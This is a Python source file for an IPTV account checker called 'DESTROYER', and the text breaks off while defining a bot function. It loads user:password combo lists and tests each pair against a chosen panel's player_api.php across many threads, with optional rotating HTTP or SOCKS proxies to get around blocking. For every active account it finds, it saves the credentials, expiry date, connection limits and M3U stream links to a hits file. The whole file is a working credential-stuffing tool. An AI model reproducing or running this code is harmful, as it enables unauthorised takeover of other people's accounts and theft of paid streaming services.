import sock
import socket
import urllib3
import telnetlib
#from urllib3.contrib.socks import SOCKSProxyManager
socket.setdefaulttimeout(120)

nickn=""
if nickn=="":
	nickn="✴️🅳🅴🆂🆃🆁🅾🆈🅴🆁✴️  "
try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass
import os,pip
import codecs
try:
	import colorama
except:
	
	pip.main(['install', 'colorama'])
try:
    import requests
except:
	print("modulo di richiesta non installato \n")
	pip.main(['install', 'requests'])
	print("modulo installato \n")
	import requests


if not os.path.exists('/sdcard/combom3u'):
    os.makedirs('/sdcard/combom3u')

if not os.path.exists('/sdcard/Hits/AK-47'):
    os.makedirs('/sdcard/Hits/AK-47')

if not os.path.exists('/sdcard/Proxies'):
    os.makedirs('/sdcard/Proxies')

if not os.path.exists('/sdcard/sound'):
    os.makedirs('/sdcard/sound')

import random, time, datetime
import subprocess
import json, sys, re,base64
import pathlib
import threading
import shutil
from colorama import Fore, Back, Style

import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"

class fg:
    BLACK   = '\033[30m'
    RED     = '\033[34m'
    GREEN   = '\033[32m'
    YELLOW  = '\033[33m'
    BLUE    = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN    = '\033[36m'
    WHITE   = '\033[37m'
    RESET   = '\033[39m'

class bg:
    BLACK   = '\033[40m'
    RED     = '\033[41m'
    GREEN   = '\033[34m'
    YELLOW  = '\033[43m'
    BLUE    = '\033[44m'
    MAGENTA = '\033[45m'
    CYAN    = '\033[46m'
    WHITE   = '\033[47m'
    RESET   = '\033[49m'

class style:
    BRIGHT    = '\033[1m'
    DIM       = '\033[2m'
    NORMAL    = '\033[22m'
    RESET_ALL = '\033[0m'
global manda
manda=""




global kate
kate=""
global envivo
envivo=0
global peliculas
peliculas=0
global series
series=0
global juanka
juanka=""
global current_time
global hora_inicio
global hora_ini

global time_
time_= time.localtime()
current_time = time.strftime("%Y-%m-%d -- %H:%M:%S", time_)
hora_ini = time.strftime("%H:%M:%S", time_)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)

nick=  " ✴️🅳🅴🆂🆃🆁🅾🆈🅴🆁✴️    "
		
try:
	import cfscrape
	sesq= requests.Session()
	ses = cfscrape.create_scraper(sess=sesq)
except:
	ses= requests.Session()

try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass

pattern= "(^\S{2,}:\S{2,}$)|(^.*?(\n|$))"

os.system('clear')
def clear():
    os.system('clear')
say=0
hit=0
bul=0
cpm=1
global Host2
Host2=""
global Est
Est=""
global Cone
Cone=""
global Exp
Exp=""
global m3u
m3u=""
global m3u_
m3u_=""
global cate
cate=""
global canales
canales=0
global acon
acon=""
global mcon
mcon=""
global expire
expire=""
sayi2=""
feyzo2=( )
                                   
print(feyzo2)

def a(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.02)
a("""  \33[33m
		
  ____            _                             
 |  _ \  ___  ___| |_ _ __ ___  _   _  ___ _ __ 
 | | | |/ _ \/ __| __| '__/ _ \| | | |/ _ \ '__|
 | |_| |  __/\__ \ |_| | | (_) | |_| |  __/ |   
 |____/ \___||___/\__|_|  \___/ \__, |\___|_|   
                                |___/    
	\33[96m\33[0m""")
time.sleep(1)
print(feyzo2) 


say=0
dsy=""
dir='/sdcard/combo/'
for files in os.listdir (dir):
	#if files.endswith(".txt"):
	say=say+1
	dsy=dsy+"	"+str(say)+"-) "+files+'\n'
print ("""Escoja un Numero de combo!
	
 """+dsy+"""
 
\33[33mHay """+str(say)+""" Combinaciones disponibles!
""")

dsyno=str(input(" \33[31mNumero a escojer =\33[0m"))
say=0
for files in os.listdir (dir):
	#if files.endswith(".txt"):
	say=say+1
	if dsyno==str(say):
		dosyaa=(dir+files)
		break
say=0

clear()

print(feyzo2)  	
print(dosyaa) 
dsy=dosyaa#'/sdcard/combo/'+combo+'.txt'
combo=dsy
dosya=""
file = pathlib.Path(dsy)
if file.exists ():
    print ("EXTRACTING NOW")
else:
    print("\33[31m𝑪𝑶𝑴𝑩𝑶 𝑵𝑨𝑶 𝑬𝑵𝑪𝑶𝑵𝑻𝑹𝑨𝑫𝑶..! \33[0m") 
    dosya="sdcard/hit"
#print(len(feyzo)) 
if dosya=="sdcard/hit" :
    exit() 

c=open(dsy, 'r')
totLen=c.readlines()
uz=(len(totLen))
print(str(uz)+"  𝒄𝒐𝒎𝒃𝒐 "+dosyaa)

botsay=input("""
   \33[1;96m 𝒏𝒖𝒎𝒆𝒓𝒐 𝒅𝒆 𝒃𝒐𝒕𝒔...!\33[0m
    \33[1;33m1-30...!\33[0m
      
  𝒃𝒐𝒕𝒔= """ )
botsay=int(botsay)		
    							

print('  ')
Pro= input('[+] 𝒖𝒔𝒂𝒓 𝒑𝒓𝒐𝒙𝒊𝒆𝒔? (Y/N): ')
Pro= Pro.lower()
print('  ')
ppp=""
if Pro == "y":
	proxy_txt = input(Fore.CYAN+"""

[+]  𝑷𝒓𝒐𝒙𝒊𝒆𝒔 𝒅𝒆 𝒏𝒐𝒎𝒆 𝒅𝒆 𝒂𝒓𝒒𝒖𝒊𝒗𝒐 
		
	archivo.txt: """+Fore.WHITE)
	if "txt" not in proxy_txt:
		proxy_txt=proxy_txt+".txt"
	else:
		proxy_txt=proxy_txt
	
	file = pathlib.Path('/sdcard/combohits1/'+proxy_txt)
	if file.exists ():
		print ("𝒂𝒓𝒒𝒖𝒊𝒗𝒐 𝒑𝒓𝒐𝒙𝒚 𝒆𝒏𝒄𝒐𝒏𝒕𝒓𝒂𝒅𝒐")
	else:
	   print("\33[31m𝑵𝒆𝒏𝒉𝒖𝒎 𝒂𝒓𝒒𝒖𝒊𝒗𝒐 𝒑𝒓𝒐𝒙𝒚 𝒆𝒏𝒄𝒐𝒏𝒕𝒓𝒂𝒅𝒐..! \33[0m") 
	   ppp="nessuno"
#print(len(feyzo)) 
	if ppp=="nessuno" :
		exit() 
		
	print('  ')
	proxy_txt=('/sdcard/combohits1/'+proxy_txt)

	proxy_len = len(open(proxy_txt, 'r', errors='ignore').read().split('\n'))
	proxy_type = input('[+] 𝑫𝒊𝒈𝒊𝒕𝒆 𝒐 𝒕𝒊𝒑𝒐 𝒅𝒆 𝒑𝒓𝒐𝒙𝒚 [(H)TTP/SOCKS(4)/SOCKS(5)]: ')
	proxy_type=proxy_type.lower()
	print('  ')
	print(str(proxy_len)+" 𝒑𝒓𝒐𝒙𝒊𝒆𝒔 𝒕𝒐𝒕𝒂𝒊𝒔 "+str(proxy_txt))

class Proxies:

    def __init__(self):
        self.proxies = []

    def load_proxies(self, proxy_txt,):
        with open(proxy_txt, 'r', errors='ignore') as (f):
            self.proxies = f.read().split('\n')

    def random_proxy(self, proxy_type,):
        self.load_proxies(proxy_txt)
        proxy = random.choice(self.proxies)
        proxy_type = proxy_type.lower()
        if proxy_type == 'h':
            return {'http':proxy,  'https':proxy}
        if proxy_type == '4':
            return {'https': 'socks4://' + proxy}
        if proxy_type == '5':
            return {'https': 'socks5://' + proxy}
            
        return {'https': proxy}

               
clear()                                                   

print(feyzo2) 

print("Bot:  "+str(botsay))

dir="configs/"
print("""
𝒂𝒓𝒒𝒖𝒊𝒗𝒐 𝒕𝒐𝒕𝒂𝒍: """ + dsy + """     𝒕𝒐𝒕𝒂𝒍 """+str(uz)+""" 𝒆𝒏𝒕𝒓𝒂𝒓""")
if Pro == "y":
	print("""
	𝒔𝒆𝒍𝒆𝒄𝒊𝒐𝒏𝒆 𝒂𝒓𝒒𝒖𝒊𝒗𝒐: """+proxy_txt+"""    𝒕𝒐𝒕𝒂𝒍 𝒅𝒆  """ + str(proxy_len)+ """ IPs""")

################
panel = input("""
	\33[1m 𝑰𝒏𝒔𝒊𝒓𝒂 𝒐𝒔 𝒅𝒂𝒅𝒐𝒔 𝒅𝒐 𝒉𝒐𝒔𝒕..?? \n\n
𝐇𝐨𝐬𝐭:𝐏𝐨𝐫𝐭 =\33[0m\33[31m\33[1m""")
#=======+++=++++++====++=======
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
portal=panel

HEADERd = {'content-type':'application/json; charset=UTF-8', 'User-Agent':'(Mozilla/5.0 (Linux; Android 9; ANE-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36)',
'Host':portal ,'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}


fx=portal.replace(':','_')
kanall=""
kanall=input("""
	Informacion de los  canales..?
 1=𝒔𝒊
 2=𝒏𝒐
 𝑹𝒆𝒔𝒑𝒐𝒔𝒕𝒂 (𝑵𝒐)=""")
if not kanall=="1":
	kanall=2

print(feyzo2) 
global hora_inicio
hora_inicio=time.time()

if Pro=='y':
		ses.proxies = Proxies().random_proxy(proxy_type)
		

def live_cate(katelink):
	try:
	 	if Pro == 'y':
	 		PP = Proxies().random_proxy(proxy_type)
	 		res = ses.get(katelink, verify=False,proxies=PP)
	 		
	 	else:
	 		res = ses.get(katelink, verify=False)
	 		
	 	veri=""
	 	kate=""
	 	veri=str(res.text)
	 	for i in veri.split('category_name":"'):
	 		kate=kate+" [⭕️] "+str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
	 		kate=kate.replace("&","%26")
	 		kate=kate.replace("#"," ")

	except:pass
	
	return kate
File_="/sdcard/Hits/" + panel.replace(":","_").replace('/','') +" ꧁🅳🅴🆂🆃🆁🅾🆈🅴🆁꧂.txt"
def yaz(hits):
    dosya=open(File_,'a+', encoding='utf-8') 
    dosya.write(hits)
    dosya.close()
    
def onay(veri,user,pas):
		status=veri.split('status":')[1]
		status=status.split(',')[0]
		status=status.replace('"',"")
		katelink="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_categories"
		
		sound="/sdcard/project/moneda.mp3"
		file = pathlib.Path(sound)
		try:
		   if file.exists ():
		      ad.mediaPlay(sound)
		except:pass
		
		acon=""
		acon=veri.split('active_cons":')[1]
		acon=acon.split(',')[0]
		acon=acon.replace('"',"")
		mcon=veri.split('max_connections":')[1]
		mcon=mcon.split(',')[0]
		mcon=mcon.replace('"',"")
			
		realm=veri.split('url":')[1]
		realm=realm.split(',')[0]
		realm=realm.replace('"',"")
		port=veri.split('port":')[1]
		port=port.split(',')[0]
		port=port.replace('"',"")
		user=veri.split('username":')[1]
		user=user.split(',')[0]
		user=user.replace('"',"")
		passw=veri.split('password":')[1]
		passw=passw.split(',')[0]
		passw=passw.replace('"',"")
		expire=veri.split('exp_date":')[1]
		expire=expire.split(',')[0]
		expire=expire.replace('"',"")
		if expire=="null":
			   expire="Unlimited"
		else:
			   expire=(datetime.datetime.fromtimestamp(int(expire)).strftime('%Y-%m-%d'))
		expire=expire
			
		m3u_=("M3U: "+f"http://{realm}/get.php?username={user}&password={pas}&type=m3u_plus")
					
		if kanall=="1":
			try:
				live_cate=""
				if Pro == 'y':
					PP = Proxies().random_proxy(proxy_type)
					
					res = ses.get(katelink, verify=False,proxies=PP)
				else:
					res = ses.get(katelink, verify=False)
				
				veri=""
				kate=""
				juanka=""
				cate=""
				veri=str(res.text)
				juank=codecs.decode(veri, "unicode-escape")
				if "category_name" in juank:
						for i in juank.split('category_name":"'):
							cat1= (i.split(',"')[0])
							cat2=(cat1.split('"')[0])
							cate=cate+cat2+"\n[⭕️] "
							cate=cate.replace("\/","/")
							cate=cate.replace("[{","")
							cate=cate.replace("&","%26")
							if "*" in cate:
								cate=cate.split("*")[1]
								cate=cate.replace("\/","/")
								cate=cate.replace("[{","│")
								cate=cate.replace("&","%26")
								cate=cate.replace("#"," ")
				live_cate=cate
								
		
			except:pass
		#print(live_cate)
		
		url5="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
		try:
			 if Pro == 'y':
			 	PP = Proxies().random_proxy(proxy_type)
			 	res = ses.get(url5,verify=False,proxies=PP)
			 else:
			 	res = ses.get(url5,verify=False)
			 veri=str(res.text)
			 envivo=""
			 #if  'stream_id' in veri:
			 
			 if 'stream_id' not in veri:
			 	envivo=""
			 else:
			 	envivo=str(veri.count("stream_id"))
			 url5="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
			 if Pro == 'y':
			 	PP = Proxies().random_proxy(proxy_type)
			 	res = ses.get(url5,verify=False,proxies=PP)
			 else:
			 	res = ses.get(url5,verify=False)
			 veri=str(res.text)
			 
			 if 'stream_id' not in veri:
			 	peliculas=""
			 else:
			 	peliculas=str(veri.count("stream_id"))
			 
			 url5="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
			 if Pro == 'y':
			 	PP = Proxies().random_proxy(proxy_type)
			 	res = ses.get(url5,verify=False,proxies=PP)
			 else:
			 	res = ses.get(url5,verify=False)
			 veri=str(res.text)
			 
			 if 'series_id' not in veri:
			 	series=""
			 else:
			 	series=str(veri.count("series_id"))
		except:pass
		
		m3ulink="http://"+ panel + "/get.php?username=" + user + "&password=" + pas + "&type=m3u_plus"
		m3u=(f"http://"+panel+ "/get.php?username="+user+"%26password="+pas+"%26type=m3u_plus")
		juanka = live_cate
		cate_=juanka
		cate_=juanka.replace("&","%26")
		cate_=juanka.replace("#"," ")
		
		mtx=""
		mtx=("""
===      ✴️🅳🅴🆂🆃🆁🅾🆈🅴🆁✴️   ===
[⭕️] Module: """+str(nick)+"""
[⭕️] Host: http://"""+portal+"""
[⭕️] User: """+user+"""
[⭕️] Pass: """+pas+"""
[⭕️] Scan_date: """+current_time+"""
[⭕️] Exp_date: """ +expire+"""
[⭕️] Status: """+status+"""
[⭕️] Max_cons: """+acon+"""/"""+mcon+ """
[⭕️] List m3u: """+m3ulink )

		sayi=""
		sayi2=""
		mt=("""
[⭕️]        """+str(nick)+"""      
[⭕️] Host : http://"""+portal+"""
[⭕️]  Real : http://"""+realm+"""
[⭕️]  Port : """+port+"""
[🧑‍✈️]  User : """+user+"""
[🔐]  Pass : """+pas+"""
[⭕️]  Exp. : """+expire+""" 
[⭕️]  Act Con : """+acon+"""
[⭕️]  Max Con : """+mcon+""" 
[⭕️]  Status : """+status+"""
[⭕️]           """+str(nick)+"""   """)
			
		if not envivo =="":
			sayi2=""
			sayis2=("""
	Aᴄᴛɪᴠᴇ ᴄʜᴀɴɴᴇʟs: 
 [⭕️] ʟɪᴠᴇ ᴄʜᴀɴɴᴇʟꜱ:"""+envivo+"""
 [⭕️] ꜰɪʟᴍꜱ: """+peliculas+"""
 [⭕️]   ꜱᴇʀɪᴇꜱ: """+series+"""
 
______"""+nick+"""______""")
 
			sayi=("""
╭─[⭕️] ʟɪᴠᴇ ᴄʜᴀɴɴᴇʟꜱ:"""+envivo+"""
├─[⭕️] Films :"""+peliculas+"""
├─[⭕️] Series :"""+series+"""
╰─────────────── •""")
		imzak=""
		if kanall=="1":
			imzak2=("""  """)
			
			live_cate2=live_cate.replace(" [⭕️]","[⭕️]")
			live_cate2=live_cate.replace("%26","&")
			live_cate2=live_cate.replace("#"," ")
			imzak=("""
 ╭:«:» «» Categoría dal Vivo:
"""+str(live_cate2)+"""
 ╰──"""+current_time+"""── •""")
		
		mtl=("""
[⭕️]  m3u_Url:"""+m3ulink+"")
		m3u2=m3ulink.replace("&","%26")
		
		mtl2=("""
[⭕️]  m3u_Url:"""+m3ulink+"")
		ca_=str(live_cate2)
		
		ca_=ca_.replace("&","%26")
		
		yazx=(mtx+sayi2+imzak2)
		yaz(yazx+'\n'+'\n')
		yaz2=""
		yaz2=(mt+sayi+mtl+imzak)
	  	
		#print(mt+sayi+mtl+imzak)
		print(mtx+sayi2+imzak2)
		
		
		#with open('/sdcard/Hits/'+str(fx)+'.txt', 'a+', encoding='utf-8') as xy:
			#xy.write(yaz+'\n')
		
cpm=0

def echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio):
	#os.system("clear")
	global cpm
	
	cpmx=(time.time()-cpm)
	cpmx=(round(60/cpmx))
	#cpm=cpmx
	if str(cpmx)=="0":
		cpm=cpm
	else:
		cpm=cpmx
	time_= time.localtime()
	timex=time.time()
	
	current_time = time.strftime("%Y-%m-%d -- %H:%M:%S", time_)
	tt=(round(timex-hora_inicio)/60)
	if tt==0:
	    cpm=cpmx
	else:
	    cpm=round((round(fyz)/tt))
	
	
	if Pro=="y":
	    protype=""
	    if proxy_type=="h":
	        protype="https"
	    elif proxy_type=="4":
	        protype="socks4"
	    else:
	        protype="socks5"
	        
	echo=("""  
		
		
			
		\33[33m
		
  ____            _                             
 |  _ \  ___  ___| |_ _ __ ___  _   _  ___ _ __ 
 | | | |/ _ \/ __| __| '__/ _ \| | | |/ _ \ '__|
 | |_| |  __/\__ \ |_| | | (_) | |_| |  __/ |   
 |____/ \___||___/\__|_|  \___/ \__, |\___|_|   
                                |___/ 
 \33[96m \33[0m \033[32m
╔══    ✴️🅳🅴🆂🆃🆁🅾🆈🅴🆁✴️    ════
┃[ + ] TIME:"""+str(current_time)+"""
┃[ + ] 𝚂𝙴𝚁𝚅𝙸𝙳𝙾𝚁:"""+portal+""" 
┃[ + ] PROXY:"""+proxy_+"""
┃[ + ] 𝚄𝚂𝙴𝚁:""" +user+"""
┃[ + ] 𝙿𝙰𝚂𝚂:"""+pas+"""
┃[ + ] Hit """ + str(hit)+""" 
┃[ + ] % : """+str(oran)+"""  
┃[ + ] CPM:"""+str(cpm)+"""  
┃[ + ] Bots:"""+str(botsay)+"""  
┃[ + ] TOTAL:""" + str(fyz)+""" de """+str(uz)+""" 
╚═══════════════════
""")
    #os.system("clear")
	#print(feyzo2)
	#print(" ")
	com_=""
	ini=""
	ini=(fg.GREEN+"""┃ [ + ]Scan Start: """+fg.GREEN+str(hora_ini)+fg.RESET)
	prox=""
	if Pro=="y":
	    prox=("""
 """+fg.GREEN+str(proxy_len)+fg.GREEN+" proxies "+fg.GREEN+str(protype)+fg.GREEN+ " in archivio "+fg.GREEN+str(proxy_txt)+fg.RESET)
	else:
	  prox=("""

\033[32m┃[ + ] No Proxies\33[0m """)
	  com_=(fg.GREEN+"""
┃[ + ] Combo: """+fg.GREEN+str(dosyaa)+fg.GREEN+"""

  """+fg.RESET+""" \33[32m
 ✴️🅳🅴🆂🆃🆁🅾🆈🅴🆁✴️ 
┃ [ + ]URL:http://"""+portal+"""/get.php?username=""" +user+"""&password="""+pas+"""&type=m3u_plus
╚═══════════════════

 
""" )
	
	print(echo+ini+prox+com_)
	
	#cpm=time.time()
	 
#if int(time.time()) >= int(1704056400.0):
	#shutil.rmtree(dir)

hit=0	
def d1():
	global hit
	proxy_=""
	say=0
	for fyz in range(1,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_01'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			     	
			 
def d2():
	global hit
	proxy_=""
	say=0
	for fyz in range(2,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_02'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			     	
			 
def d3():
	global hit
	proxy_=""
	say=0
	for fyz in range(3,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_03'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
				 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
def d4():
	global hit
	proxy_=""
	say=0
	for fyz in range(4,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_04'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
def d5():
	global hit
	proxy_=""
	say=0
	for fyz in range(5,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_05'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 
def d6():
	global hit
	proxy_=""
	say=0
	for fyz in range(6,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_06'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 ✾                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 

			 
def d7():
	global hit
	proxy_=""
	say=0
	for fyz in range(7,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_07'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 			 		 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':
			 			PP = Proxies().random_proxy(proxy_type)
			 			res = ses.get(link,headers=HEADERd, verify=False,proxies=PP)
			 			proxy_=str(PP)
			 		else:
			 			res = ses.get(link,headers=HEADERd, verify=False)
			 			proxy_="No"
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
			 		#if bag1==100:
			 		      #quit()
			 veri=str(res.text)
			 echox(user,pas,bot,fyz,oran,hit,proxy_,time_,current_time,hora_inicio)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     ✾ 🇭 🇮 🇹 💫 ??                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 			 			 			 
def d8():
	global hit
	proxy_=""
	say=0
	for fyz in range(8,uz,botsay):
